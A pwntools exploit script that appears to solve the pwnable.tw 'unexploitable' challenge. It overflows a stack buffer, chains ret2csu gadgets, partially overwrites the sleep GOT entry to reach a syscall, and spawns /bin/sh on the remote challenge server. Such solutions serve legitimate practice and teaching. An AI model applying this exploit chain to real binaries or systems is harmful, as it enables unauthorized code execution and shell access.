from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./unexploitable')
#p = process('./unexploitable')
#libc = e.libc
p = remote('chall.pwnable.tw',10403)
libc = ELF('./libc_64.so.6')
main = e.symbols['main']
csu_call = 0x00000000004005D0
csu_pop = 0x00000000004005E6

def chain(r12,r13,r14,r15,ret):
	c = p64(0) # rsp + 8
	c += p64(0) # rbx
	c += p64(1) # rbp
	c += p64(r12) # call
	c += p64(r13) # edi
	c += p64(r14) # rsi
	c += p64(r15) # rdx
	c += p64(ret)
	return c

payload = b'A'*24
payload += p64(csu_pop)
payload += chain(e.got['read'], 0, e.bss() + 0x100, 10, csu_call)
payload += chain(0, 0, 0, 0, main)
# print len(payload)
sleep(3)
p.send(payload) 
p.send(b'/bin/sh\x00') # e.bss() + 0x100

payload2 = b'A'*24
payload2 += p64(csu_pop)
payload2 += chain(e.got['read'], 0, e.got['sleep'], 1, csu_call)
payload2 += chain(e.got['read'], 0, e.bss(), 59, csu_call)
payload2 += chain(e.got['sleep'], e.bss()+0x100, 0, 0, csu_call)
# print len(payload2)
sleep(3)
p.send(payload2)
#p.send('\xde') # 0xcb6de <pause+14>:	syscall
p.send(b'\xfb') # 0xcb6fb <pause+43>:	syscall
p.send(b'A'*59)

p.interactive()